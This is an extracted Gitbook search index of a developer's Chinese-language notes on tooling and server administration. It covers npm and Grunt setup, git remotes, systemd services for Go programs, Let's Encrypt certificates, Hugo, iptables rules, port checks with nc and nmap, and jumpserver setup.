install -g grunt-cli npm install 准备一份新的 Grunt 项目 一般需要在你的项目中添加两份文件： package.json 和 Gruntfile。 生成: npm init npm install -g grunt-init npm install grunt --save-dev 然后安装模板，目前有三种模板是由grunt官方做维护的，还有别的可在github上找到，或者你自己实现一个。 官方模板的安装命令如下： git clone git://github.com/gruntjs/grunt-init-gruntfile.git $HOME/.grunt-init/ git clone git://github.com/gruntjs/grunt-init-jquery.git %HOME%/.grunt-init/ git clone git://github.com/gruntjs/grunt-init-node.git $HOME/.grunt-init/ 上面的$HOME是系统目录,例如C:\\Users\\mdshi\\,也可以将它加入到环境变量 HOME C:\\Users\\mdshi\\ 查看 cmd-> echo %HOME% windows: git clone git://github.com/gruntjs/grunt-init-gruntfile.git %USERPROFILE%/.grunt-init/gruntfile 或者: git clone git://github.com/gruntjs/grunt-init-gruntfile.git %HOME%/.grunt-init/gruntfile grunt-init %HOME%/.grunt-init/gruntfile 三种分别对应默认grunt模板，jquery插件的grunt模板，node包的grunt模板。 然后就可以适用grunt-init命令来初始化你的Gruntfile.js文件了，例如你要安装默认模板： grunt-init grunt-init-gruntfile #最后一个参数也可以是模板所在的文件夹 grunt-init %HOME%/.grunt-init/ 它会问你一些问题，然后根据你的答案创建当前项目的Gruntfile.js文件。 安装iview-admin cd D:\\www\\yiyang\\static2 && git clone https://github.com/iview/iview-admin.git cd D:\\www\\yiyang\\static2\\iview-admin 安装依赖 npm install --save-dev 运行 npm run dev 打包 npm run build https://www.cnblogs.com/chaojidan/p/4239562.html?utm_source=tuicool&utm_medium=referral http://blog.sae.sina.com.cn/archives/4106 https://www.cnblogs.com/vajoy/p/3983831.html 修复mysql: myisamchk http://blog.itpub.net/29500582/viewspace-1301666/ Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"front/npm.html":{"url":"front/npm.html","title":"npm安装package.json中的模块依赖","keywords":"","body":"npm安装package.json中的模块依赖 1.package.json不存在时 命令:npm init可自动创建package.json文件 2.package.json存在时 直接命令:npm install 或者 npm install –save-dev会自动将package.json中的模块安装到node-modules文件夹下 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"ftp/创建ftp.html":{"url":"ftp/创建ftp.html","title":"生成一个fpt账户:","keywords":"","body":"生成一个fpt账户: 阿里云主机 用户名：1171 密码：用户密码 目录 cd /home/ftproot mkdir 1171 lnmp ftp add 生成: Enter ftp account name: 1171 (#用户名) Enter password for ftp account 1171: (#用户密码) Enter directory for ftp account 1171: /home/ftproot/1171 (#ftp根目录) 然后赋予权限组: chown www:www -R ./1171 登录截图: 图片 - images 文档: https://lnmp.org/faq/ftpserver.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"git/aliyun.html":{"url":"git/aliyun.html","title":"大家在下面4个代码库里面分别跑一下如下命令：","keywords":"","body":"大家在下面4个代码库里面分别跑一下如下命令： git remote rm origin git remote add origin git@code.aliyun.com:1706/marketing-public-api.git git remote rm origin git remote add origin git@code.aliyun.com:1706/marketing-public-ui.git git remote rm origin git remote add origin git@code.aliyun.com:1706/marketing-private-api.git git remote rm origin git remote add origin git@code.aliyun.com:1706/marketing-private-ui.git 切换分支 git checkout -b dev git push origin dev Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"git/pull.html":{"url":"git/pull.html","title":"文件读取完成","keywords":"","body":"Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-24 17:45:53 "},"git/push.html":{"url":"git/push.html","title":"hugo的一些md参数","keywords":"","body":"hugo的一些md参数 {{.LogicalName}} {{.Path}} {{.Dir}} ssh提交git，避免每次bat脚本运行都要输入用户名和密码 1.生成ssh ssh-keygen -t rsa -C \"952750120@qq.com\" 图片 - images 一直按回车即可。 可以看出，ssh被保存在C:\\Users\\mdshi.ssh目录下。 图片 - images 2.把在本地生成ssh公玥复制到github上 id_rsa.pub 把出现的内容包括ssh开头和已邮箱结尾的全部内容复制下来，打开github，登录进入自己的账户，点击自己账号的头像，点击setting，在打开的网页中点击屏幕左边的SSH and GPG keys，在出现的界面下，点击New SSH key,然后把之前赋值的内容复制进key下面的框内即可，title随便你取。 图片 - images 参考文档： http://blog.csdn.net/lonyw/article/details/75392410 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"gitbook/github关联gitbook.html":{"url":"gitbook/github关联gitbook.html","title":"gitbook关联github","keywords":"","body":"gitbook关联github 构建书籍内容 使用 gitbook build 将书籍内容输出到默认目录，也就是当前目录下的 _book 目录。 gitbook build https://jimmysong.io/hugo-handbook/steps/create-github-pages.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 18:10:56 "},"golang/heat-update.html":{"url":"golang/heat-update.html","title":"golang实现文件的热更新","keywords":"","body":"golang实现文件的热更新 https://segmentfault.com/a/1190000008487440 http://dmdgeeker.com/post/golang-signal/ http://colobu.com/2015/10/09/Linux-Signals/ 信号说明 在POSIX.1-1990标准中定义的信号列表 信号 值 动作 说明 SIGHUP 1 Term 终端控制进程结束(终端连接断开) SIGINT 2 Term 用户发送INTR字符(Ctrl+C)触发 SIGQUIT 3 Core 用户发送QUIT字符(Ctrl+/)触发 SIGILL 4 Core 非法指令(程序错误、试图执行数据段、栈溢出等) SIGABRT 6 Core 调用abort函数触发 SIGFPE 8 Core 算术运行错误(浮点运算错误、除数为零等) SIGKILL 9 Term 无条件结束程序(不能被捕获、阻塞或忽略) SIGSEGV 11 Core 无效内存引用(试图访问不属于自己的内存空间、对只读内存空间进行写操作) SIGPIPE 13 Term 消息管道损坏(FIFO/Socket通信时，管道未打开而进行写操作) SIGALRM 14 Term 时钟定时信号 SIGTERM 15 Term 结束程序(可以被捕获、阻塞或忽略) SIGUSR1 30,10,16 Term 用户保留 SIGUSR2 31,12,17 Term 用户保留 SIGCHLD 20,17,18 Ign 子进程结束(由父进程接收) SIGCONT 19,18,25 Cont 继续执行已经停止的进程(不能被阻塞) SIGSTOP 17,19,23 Stop 停止进程(不能被捕获、阻塞或忽略) SIGTSTP 18,20,24 Stop 停止进程(可以被捕获、阻塞或忽略) SIGTTIN 21,21,26 Stop 后台程序从终端中读取数据时触发 SIGTTOU 22,22,27 Stop 后台程序向终端中写数据时触发 windows下支持的信号时有限的, 在signal.h中定义, 分别是 SIGINT Ctrl+C中断 SIGILL 非法指令 SIGFPE 浮点异常 SIGSEGV 段错误, 非法指针访问 SIGTERM kill发出的软件终止 SIGBREAK Ctrl+Break中断 SIGABRT 调用abort导致 信号用途示例 我们可以利用信号，实现一些动态功能（如不重启刷新加载配置等）。 在使用Nginx时，可以使用nginx -s reload来进行配置文件重载，而不中断服务。 这里我们使用Go语言信号量来模拟一下这个功能。 发送信号 sudo kill -USR1 24036 # 24036是进程id cd D:\\mnt\\zouhuigang.github.io\\content\\golang https://github.com/araddon/gou/pull/7 https://github.com/araddon/gou/pull/7/files 系统任务 vi /usr/lib/systemd/system/ZsurnameServer.service [Unit] Description=zouhuigang zsurname server Documentation=https://github.com/zouhuigang After=network.target [Service] Type=simple WorkingDirectory=/nfs_file/software/zsurname ExecStart=/nfs_file/software/zsurname/ZsurnameServer Restart=on-failure PrivateTmp=true [Install] WantedBy=multi-user.target 启动ZsurnameServer： systemctl daemon-reload systemctl enable ZsurnameServer systemctl start ZsurnameServer journalctl -u ZsurnameServer.service 更新配置 sudo kill -USR1 进程id 查看进程 ps aux | grep ZsurnameServer 显示： [root@k8s-master1 system]# ps aux | grep ZsurnameServer root 1413 0.0 0.0 187032 3208 ? Ssl 11:31 0:00 /nfs_file/software/zsurname/ZsurnameServer root 1423 0.0 0.0 112660 972 pts/1 S+ 11:31 0:00 grep --color=auto ZsurnameServer 可以看到进程id就是1413 日志另存： 图片 - images https://stackoverflow.com/questions/37585758/how-to-redirect-output-of-systemd-service-to-a-file 问题汇总： Q1:systemd日志出现异常 当使用systemctl status dnsmasq 查看某个服务的状态时候，会提示以下信息 Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable.并且服务输出的日志也都不可见。 总结：主要是journalctl满了，才会出现这种情况，可以 journalctl --vacuum-size=1G 来释放占用的磁盘空间，日志文件保存在/var/log/journal/目录下。 默认配置： #限制全部日志文件加在一起最多可以占用多少空间，默认值是10%空间与4G空间两者中的较小者 SystemMaxUse=64G #默认值是15%空间与4G空间两者中的较大者 SystemKeepFree=1G #单个日志文件的大小限制，超过此限制将触发滚动保存 SystemMaxFileSize=128M A1: 这是由于btrfs 挂载的/var/log路径比systemd-journald.service启动时间晚导致。所以我们需要修改/usr/lib/systemd/system/systemd-journald.service ，在After=local-fs.target添加local-fs.target。这样systemd-journald.service就比文件系统挂载晚。该问题就可以得到解决。 https://bbs.deepin.org/forum.php?mod=viewthread&tid=43821 A1: 了解现有磁盘使用量 大家可以利用–disk-usage标记查看journal的当前磁盘使用量： [root@k8s-master1 log]# journalctl --disk-usage Archived and active journals take up 4.0G on disk. 删除日志,例如，去年之后的条目才能保留： sudo journalctl --vacuum-time=1years 或者 journalctl --vacuum-size=10M journalctl --vacuum-size=1G 日志文件保存在/var/log/journal/目录下。 http://blog.csdn.net/zstack_org/article/details/56274966 https://www.linuxquestions.org/questions/linux-newbie-8/systemd-fails-to-write-4175527467/ http://ju.outofmemory.cn/entry/343962 https://www.lulinux.com/archives/3135 A2: 问题描述 原先/var/log/journal/的journald日志一直占用4G的存储空间，因为个人电脑不需要保留这么长久的日志信息，通过设置/etc/systemd/journald.conf SystemMaxUse=500M 将日志信息限制到500M 但是问题来了，通过systemctl status xx.service查看服务运行状态的时候发现所有的服务日志的最后一行全都是Warning: Journal has been rotated since unit was started. Log output is incomplete or unavailable. 问题解决 查阅官方资料发现SystemMaxUse确实可以限制日志容量，但是到达容量上限以后是不会删除原先日志文件 我是通过SystemMaxFiles=20限制最多存在20个文件，占容量500M~600M，这下才解决问题 https://github.com/MatcherAny/MatcherAny/issues/3 https://www.cnblogs.com/hadex/p/6837688.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"golang/依赖管理.html":{"url":"golang/依赖管理.html","title":"依赖管理","keywords":"","body":"＃＃＃　依赖管理 $ sudo go get github.com/Masterminds/glide $ sudo go install github.com/Masterminds/glide 初始化项目 初始化，glide扫描代码目录，创建一个glide.yaml文件，文件中记录了所有的依赖 glide init 解析包依赖 glide update Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"golang-so/":{"url":"golang-so/","title":"生成so库","keywords":"","body":"生成so库 目录： go build -o libdoubler.so -buildmode=c-shared zexcel 单个文件： go build -o libdoubler.so -buildmode=c-shared main.go 将生成libhello.so libhello.h文件 检测库是否正常 This puts libdoubler.so in your current directory. Let’s check we really have a dynamic shared library: $ file libdoubler.so libdoubler.so: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked ... $ nm -D libdoubler.so | grep \"T DoubleIt\" 000000000005d230 T DoubleIt linux下python调用so，win下用会报错 图片 - ./python调用so.png 参考文档： https://www.darkcoding.net/software/building-shared-libraries-in-go-part-1/ https://stackoverflow.com/questions/1757090/shared-library-in-go https://www.darkcoding.net/software/building-shared-libraries-in-go-part-2/ Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"golang-so/runso/":{"url":"golang-so/runso/","title":"调用so库","keywords":"","body":"调用so库 cp /go/src/app/vendor/github.com/zouhuigang/package/zexcel/libhello.so /usr/lib/ go build -o main.go Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"hack/readme.html":{"url":"hack/readme.html","title":"文件读取完成","keywords":"","body":"https://www.anquanke.com/ Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"hprose/ip归属地/go-server/":{"url":"hprose/ip归属地/go-server/","title":"ip归属地代码","keywords":"","body":"ip归属地代码 链接: https://pan.baidu.com/s/1bXCMigogvUL2a6zq0wv1bA 密码: payg 将编译好的(ZipServer+qqzeng.dat)上传到服务器,端口号3334 测试运行: chmod +x ZipServer && nohup ./ZipServer & 后台运行: chmod +x ZipServer && nohup ./ZipServer & 关闭后台程序: killall ZipServer Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-31 16:34:06 "},"hprose/qa测试.html":{"url":"hprose/qa测试.html","title":"qa测试","keywords":"","body":"qa测试 链接: https://pan.baidu.com/s/1AaxQzdbvNO-qd3EU-nlNqQ 密码: 5ds6 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-31 16:31:23 "},"hprose/手机归属地/":{"url":"hprose/手机归属地/","title":"将编译好的(ZphoneServer+phone.dat)上传到服务器,端口号3333","keywords":"","body":"将编译好的(ZphoneServer+phone.dat)上传到服务器,端口号3333 测试运行: chmod +x ZphoneServer && nohup ./ZphoneServer & 后台运行: chmod +x ZphoneServer && nohup ./ZphoneServer & 关闭后台程序: killall ZphoneServer Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"hprose/手机归属地/go-server.html":{"url":"hprose/手机归属地/go-server.html","title":"go-server","keywords":"","body":"go-server 链接: https://pan.baidu.com/s/1EfSCLha5TjgS9LvrVY_VFA 密码: y1mf Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-31 16:29:01 "},"hprose/手机归属地/上传到服务器的文件.html":{"url":"hprose/手机归属地/上传到服务器的文件.html","title":"上传到服务器的文件","keywords":"","body":"上传到服务器的文件 链接: https://pan.baidu.com/s/1H9ZUtcGdl53rQ5aCRKI4kg 密码: 7x73 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-31 16:27:36 "},"https/README-host.html":{"url":"https/README-host.html","title":"使用","keywords":"","body":"使用 git clone https://github.com/letsencrypt/letsencrypt $ cd letsencrypt $ ./letsencrypt-auto --help Let's Encrypt 验证方式 Let's Encrypt 使用两种方式对申请的域名进行验证： 1、 手动验证 按照提示在申请证书的服务器上使用一个指定的URL提供一个指定的文件内容来进行验证，进行手动验证的服务器IP地址会被 Let's Encrypt 服务端记录在案。 2、 自动验证 在 目标服务器 （指域名解析对应的IP地址的服务器，下同）上运行客户端，并启动一个 80 或 443 端口进行自动验证。包括独立模式和其他web sever验证模式，在 Plugins 中详细解释 手动验证 ./letsencrypt-auto certonly --manual -d www.anooc.com 选择 Yes 继续后，便会提示创建一个指定内容的 URL 用来验证对域名及服务器的所有权，注意这个URL仍然需要部署在 目标服务器 上： Create a file containing just this data: G3UdelazW3uCQSk2JIiBX-X3_nk4uFLCN57Ih6--xUs.-QfnFZBzb2toRS_u4TSdmjy38XELnboJMzn2VBx5Ydo And make it available on your web server at this URL: http://www.anooc.com/.well-known/acme-challenge/G3UdelazW3uCQSk2JIiBX-X3_nk4uFLCN57Ih6--xUs 根据提示，创建一个文件目录： mkdir -p 网站根目录/.well-known/acme-challenge 创建文件： echo 'G3UdelazW3uCQSk2JIiBX-X3_nk4uFLCN57Ih6--xUs.-QfnFZBzb2toRS_u4TSdmjy38XELnboJMzn2VBx5Ydo'>>G3UdelazW3uCQSk2JIiBX-X3_nk4uFLCN57Ih6--xUs 问题： 修改：/etc/nginx/conf.d/default.conf 由于nginx可能不支持.well-konw的访问，所有在配置文件中添加 location ^~ /.well-known/acme-challenge/ { default_type \"text/plain\"; root /usr/share/nginx/html; } location = /.well-known/acme-challenge/ { return 404; } 或者： location ~ /.well-known/acme-challenge { allow all; } 可以看到，上面的root，我们指定根目录为：/usr/share/nginx/html，因为我的应用是通过NodeJS的ExpressJS写的，如果修改源代码的话，比较麻烦。因此我就让检验的链接指向了nginx默认的文件夹下。 location = /.well-known/acme-challenge/ { return 404; } 要去掉，不然CertBot会无法验证 输出： [root@k8s-master letsencrypt]# ./letsencrypt-auto certonly --manual -d www.xbaod.com Saving debug log to /var/log/letsencrypt/letsencrypt.log Obtaining a new certificate Performing the following challenges: http-01 challenge for www.xbaod.com ------------------------------------------------------------------------------- NOTE: The IP of this machine will be publicly logged as having requested this certificate. If you're running certbot in manual mode on a machine that is not your server, please ensure you're okay with that. Are you OK with your IP being logged? ------------------------------------------------------------------------------- (Y)es/(N)o: Y ------------------------------------------------------------------------------- Create a file containing just this data: 9HYamP-gDXrwB4UeXpry9zwL59e3G03VPbxNv_QIsvU.-QfnFZBzb2toRS_u4TSdmjy38XELnboJMzn2VBx5Ydo And make it available on your web server at this URL: http://www.xbaod.com/.well-known/acme-challenge/9HYamP-gDXrwB4UeXpry9zwL59e3G03VPbxNv_QIsvU ------------------------------------------------------------------------------- Press Enter to Continue9HYamP-gDXrwB4UeXpry9zwL59e3G03VPbxNv_QIsvU.-QfnFZBzb2toRS_u4TSdmjy38XELnboJMzn2VBx5Ydo Waiting for verification... Cleaning up challenges IMPORTANT NOTES: - Congratulations! Your certificate and chain have been saved at: /etc/letsencrypt/live/www.xbaod.com/fullchain.pem Your key file has been saved at: /etc/letsencrypt/live/www.xbaod.com/privkey.pem Your cert will expire on 2017-11-20. To obtain a new or tweaked version of this certificate in the future, simply run letsencrypt-auto again. To non-interactively renew *all* of your certificates, run \"letsencrypt-auto renew\" - If you like Certbot, please consider supporting our work by: Donating to ISRG / Let's Encrypt: https://letsencrypt.org/donate Donating to EFF: https://eff.org/donate-le [root@k8s-master letsencrypt]# 生成证书成功，证书文件保存在当前服务器的/etc/letsencrypt/live/www.xbaod.com/目录下 参考文档： http://www.yuchenw.com/help/show.asp?id=2728 https://segmentfault.com/a/1190000005797776 http://www.nginx.cn/115.html http://www.ituring.com.cn/article/217692 http://www.restran.net/2017/01/24/nginx-letsencrypt-https/ Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"https/":{"url":"https/","title":"使用docker生成https证书","keywords":"","body":"使用docker生成https证书 docker pull quay.io/letsencrypt/letsencrypt:latest 方式1： docker run --rm -p 80:80 -p 443:443 -v /etc/letsencrypt:/etc/letsencrypt quay.io/letsencrypt/letsencrypt auth --standalone -m 952750120@qq.com --agree-tos -d www.anooc.com -d www.xbaod.com 启动nginx: docker run --name nginx -p 80:80 -p 443:443 \\ -v /etc/nginx/conf.d:/etc/nginx/conf.d \\ -v /etc/letsencrypt:/etc/letsencrypt \\ nginx 方式2(手动)： docker run -it --rm -p 80:80 -p 443:443 \\ -v /etc/letsencrypt:/etc/letsencrypt \\ quay.io/letsencrypt/letsencrypt auth 自动更新证书： docker run --rm -p 80:80 -p 443:443 \\ -v /etc/letsencrypt:/etc/letsencrypt \\ quay.io/letsencrypt/letsencrypt renew \\ --standalone 运行这个命令时，certbot会自动检查确认证书有效期，如果过期时间在一个月之内，就会自动更新。 在CoreOS中，由于没有Cron，我们需要通过systemd的timer来做定时调度，比如每个月运行一次这个renew任务就可以了，不过记得运行之前先停止nginx容器，运行之后再启动nginx容器 Standalone 使用独立模式进行自动验证，需要在 目标服务器 上运行 Let's Encrypt 客户端，并指定 certonly 和 --standalone参数。本模式需要绑定 80 或 443 端口进行域名验证，所以如果服务器上已有web server运行并侦听这2个端口，则需要先关闭web server。 Webroot 如果 目标服务器 已有web server运行，并且不能够关闭服务来获取和安装证书，可以使用 Webroot plugin。在运行 Let's Encrypt 客户端时指定 certonly 和 --webroot 参数，并使用 --webroot-path 或 -w 参数来指定 webroot 目录，比如 --webroot-path /usr/share/nginx/html docker run --rm -p 80:80 -p 443:443 -v /etc/letsencrypt:/etc/letsencrypt quay.io/letsencrypt/letsencrypt auth --webroot -m 952750120@qq.com --agree-tos -d www.anooc.com -d www.xbaod.com https://imququ.com/post/letsencrypt-certificate.html http://blog.csdn.net/hj7jay/article/details/54405615 http://www.jianshu.com/p/5afc6bbeb28c Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"hugo/introduce.html":{"url":"hugo/introduce.html","title":"hugo","keywords":"","body":"hugo Hugo是由Go语言实现的静态网站生成器。简单、易用、高效、易扩展、快速部署。 其他方案: github page+ hexo 下载 https://github.com/gohugoio/hugo/releases 得到二进制文件hugo.exe,将hugo.exe复制到D:\\software\\hugo目录下，然后设置环境变量（ D:\\software\\hugo；）。 使用 hugo new site /path/to/site 1.cmd打开命令行 cd D:\\mnt\\zouhuigang.github.io hugo new site D:\\mnt\\zouhuigang.github.io\\pp cd D:\\mnt\\zouhuigang.github.io\\pp hugo new about.md about.md 自动生成到了 content/about.md ，打开 about.md 看下: --- title: \"About\" date: 2018-01-30T15:53:11+08:00 draft: true --- 2.创建文章 创建第一篇文章，放到 post 目录，方便之后生成聚合页面。 hugo new post/first.md 3.安装皮肤 # 创建 themes 目录 $ cd themes $ git clone https://github.com/balaramadurai/hugo-travelify-theme.git 4.运行Hugo 在你的站点根目录执行 Hugo 命令进行调试： $ hugo server --theme=hugo-travelify-theme --buildDrafts （注明：v0.15 版本之后，不再需要使用 --watch 参数了） 浏览器里打开： http://localhost:1313 5.部署 假设你需要部署在 GitHub Pages 上，首先在GitHub上创建一个Repository，命名为：coderzh.github.io （coderzh替换为你的github用户名）。 在站点根目录执行 Hugo 命令生成最终页面： $ hugo --theme=hugo-travelify-theme --baseUrl=\"http://zouhuigang.github.io/\" （注意，以上命令并不会生成草稿页面，如果未生成任何文章，请去掉文章头部的 draft=true 再重新生成。） 如果一切顺利，所有静态页面都会生成到 public 目录，将pubilc目录里所有文件 push 到刚创建的Repository的 master 分支。 Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"hugo/use.html":{"url":"hugo/use.html","title":"格式化时间","keywords":"","body":"格式化时间 { dateFormat \"2006-01-02 15:04:05\" .Date }} 启动 hugo server --theme=jane --buildDrafts Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"iptables/":{"url":"iptables/","title":"查看已添加规则","keywords":"","body":"查看已添加规则 iptables -L -n iptables -nL --line-number iptables -nv --line-number iptables -t nat -nL 例子 #允许所有本机向外的访问 iptables -A OUTPUT -j ACCEPT #允许外部访问22端口 iptables -A INPUT -p tcp --dport 22 -j ACCEPT #屏蔽ip访问本服务器 iptables -l INPUT -s 123.45.6.7 -j DROP #减少不安全的端口连接 iptables -A OUTPUT -p tcp --sport 31337 -j DROP #关闭端口 34163 iptables -A INPUT -p tcp --dport 34163 -j DROP #如果我们允许某个网段下的所有ip都可以访问的话比如1.2.3.[0-255]，我们可以 iptables -A INPUT -s 1.2.3.0/24 -p tcp --dport -j ACCEPT #关闭8080端口,禁止所有的ip访问 iptables -A INPUT -p tcp --dport 8080 -j DROP #只让183.193.113.185访问8080端口,ip在前，禁止端口在后 iptables -A INPUT -s 183.193.113.185 -p tcp --dport 8080 -j ACCEPT iptables -A INPUT -s 139.196.48.36 -p tcp --dport 8080 -j ACCEPT iptables -I INPUT 5 -s 10.254.74.13 -p tcp --dport 8080 -j ACCEPT #kube-da iptables -I INPUT 5 -s 127.0.0.1 -p tcp --dport 8080 -j ACCEP iptables -A INPUT -p tcp --dport 8080 -j DROP 例如： ACCEPT tcp -- 183.193.113.185 0.0.0.0/0 tcp dpt:8080 DROP tcp -- 0.0.0.0/0 0.0.0.0/0 tcp dpt:8080 #删除规则 iptables -D INPUT 2 #删除第二条规则 #插入第4条 iptables -I INPUT 4 -s 139.196.48.36 -p tcp --dport 8080 -j ACCEPT iptables -I INPUT 4 -s 139.196.16.67 -p tcp --dport 8080 -j ACCEPT #添加局域网的ip段，拨号上网ip会变，网段不会变 iptables -I INPUT 4 -s 101.81.0.0/16 -p tcp --dport 8080 -j ACCEPT 单个IP的命令是 iptables -I INPUT -s 211.1.0.0 -j DROP 封IP段的命令是 iptables -I INPUT -s 211.1.0.0/16 -j DROP iptables -I INPUT -s 211.2.0.0/16 -j DROP iptables -I INPUT -s 211.3.0.0/16 -j DROP 封整个段的命令是 iptables -I INPUT -s 211.0.0.0/8 -j DROP 封几个段的命令是 iptables -I INPUT -s 61.37.80.0/24 -j DROP iptables -I INPUT -s 61.37.81.0/24 -j DROP 测试端口的可用性 #https://nmap.org/man/zh/ #nmap-ncat yum install -y nc 下面的命令会检查远程主机 192.168.5.10 上是否打开了端口 80、22 和 21(我们也可以使用主机名)： nc -v 139.196.16.67 8080 端口未打开返回状态为非0 方法2. yum install nmap -y nmap ip -p port 测试端口 nmap ip 显示全部打开的端口 根据显示close/open确定端口是否打开。 测试: [root@k8s-master ~]# nmap 139.196.16.67 -p 8080 Starting Nmap 6.40 ( http://nmap.org ) at 2017-07-08 08:23 CST Nmap scan report for 139.196.16.67 Host is up (0.00037s latency). PORT STATE SERVICE 8080/tcp open http-proxy Nmap done: 1 IP address (1 host up) scanned in 0.07 seconds [root@k8s-master ~]# state状态说明： open意味着目标主机的应用程序在监听(listen) closed意味着端口没有监听，但随时可能打开。 filtered意味着firewall,阻碍了端口访问。 unfiltered表示无法确定开放与否。 端口问题 查看端口被关闭： PORT STATE SERVICE 9090/tcp closed zeus-admin netstat -tln | grep 9090 netstat -apn|grep 9090 配置正确 kubernetes apiserver-host主机地址 iptables -I INPUT 5 -s 10.254.74.13 -p tcp --dport 8080 -j ACCEPT #kube-da 保存问题 首先iptables -L -n看一下配置是否正确。 没问题后，先不要急着保存，因为没保存只是当前有效，重启后就不生效，这样万一有什么问题，可以后台强制重启服务器恢复设置。 #保存 [root@woxplife ~]# service iptables save #开机启动 [root@woxplife ~]# systemctl enable iptables.service 参考文档： http://www.cnblogs.com/bethal/p/5806525.html https://stackoverflow.com/questions/11222222/unkown-service-running-on-my-server http://dockone.io/question/1266#!answer_form Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"java/java.html":{"url":"java/java.html","title":"下载","keywords":"","body":"下载 http://www.oracle.com/technetwork/cn/java/javase/downloads/jdk8-downloads-2133151-zhs.html https://www.cnblogs.com/liangml/p/5969007.html 以root用户登录将下载的jdk-8u92-linux-x64.tar.gz文件放到/temp目录下，使用如下命令解压 wget http://download.oracle.com/otn-pub/java/jdk/8u171-b11/512cd62ec5174c3487ac17c61aaa89e8/jdk-8u171-linux-x64.tar.gz tar zxvf jdk-8u171-linux-x64.tar.gz mv /home/zhg/下载/jdk1.8.0_171 /opt/ 创建软连接 cd /bin ln -s /opt/jdk1.8.0_171/bin/java java 验证: zhg@zhg-ThinkPad-E450c:/bin$ java -version java version \"1.8.0_171\" Java(TM) SE Runtime Environment (build 1.8.0_171-b11) Java HotSpot(TM) 64-Bit Server VM (build 25.171-b11, mixed mode) zhg@zhg-ThinkPad-E450c:/bin$ 设置Java环境(sudo vi /etc/profile): #java环境变量 export JAVA_HOME=/opt/jdk1.8.0_171 export JRE_HOME=${JAVA_HOME}/jre export CLASSPATH=.:${JAVA_HOME}/lib:${JRE_HOME}/lib export PATH={JAVA_HOME}/bin:$PATH 生效: source /etc/profile 查看: echo $JAVA_HOME 安装tomcat https://tomcat.apache.org/download-90.cgi sudo tar zvxf apache-tomcat-9.0.10.tar.gz Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"js/":{"url":"js/","title":"前端获取手机型号","keywords":"","body":"前端获取手机型号 网址：https://zouhuigang.github.io/js/%E8%8E%B7%E5%8F%96%E6%89%8B%E6%9C%BA%E5%9E%8B%E5%8F%B7.html Copyright © anooc.com 2018-2019 all right reserved，powered by GitbookUpdated at 2018-07-30 16:20:58 "},"jumpserver/":{"url":"jumpserver/","title":"1.第一次使用jumpserver的几个概念","keywords":"","body":"1.第一次使用jumpserver的几个概念 \" 公私钥\"认证方式简单的解释:首先在客户端上创建一对公私钥 （公钥文件：~/.ssh/id_rsa.pub； 私钥文件：~/.ssh/id_rsa）。然后把公钥放到服务器上（~/.ssh/authorized_keys）, 自己保留好私钥.在使用ssh登录时,ssh程序会发送私钥去和服务器上的公钥做匹配.如果匹配成功就可以登录了。 UI面板中的： 创建系统用户：创建系统用户，会在服务器上新建一个用户，然后可以用该用户登录服务器。所以不要用root,防止不小心登录不上服务器了。 管理用户：是各个服务器的登录用户和密码。 a.首先在资产管理->管理用户列表->创建管理用户,将各个服务器的用户名和密码（私钥）保存起来 b.然后创建资产(也就是服务器等信息),填入Ip的选择管理用户之后，可以测试管理用户是否可以登录成功，返回SUCCESS！再刷新硬件信息,完成。 c.之后再创建系统用户，ssh链接登录服务器。 d.权限管理，将2台服务器的控制权，转给当前登录用户。 e.coco管理端，登录不同服务器。 获取服务器的秘钥 ssh-keygen -t rsa -P '' #把id_rsa.pub追加到授权的key里面去。 #cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys 2.docker启动服务 jumpserver 外网推送 docker login --username=952750120@qq.com registry.cn-hangzhou.aliyuncs.com docker tag jumpserver/jumpserver:v0.4.0-beta1 registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/jumpserver-jumpserver:v0.4.0-beta1 docker push registry.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/jumpserver-jumpserver:v0.4.0-beta1 coco 内网推送，可以选择走内网，速度将大大提升，并且将不会损耗您的公网流量 docker login --username=952750120@qq.com registry-internal.cn-hangzhou.aliyuncs.com docker tag jumpserver/coco:v0.4.0-beta1 registry-internal.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/jumpserver-coco:v0.4.0-beta1 docker push registry-internal.cn-hangzhou.aliyuncs.com/zhg_docker_ali_r/jumpserver-coco:v0.4.0-beta1 luna docker tag jumpserver/luna:v0.4.0-beta1 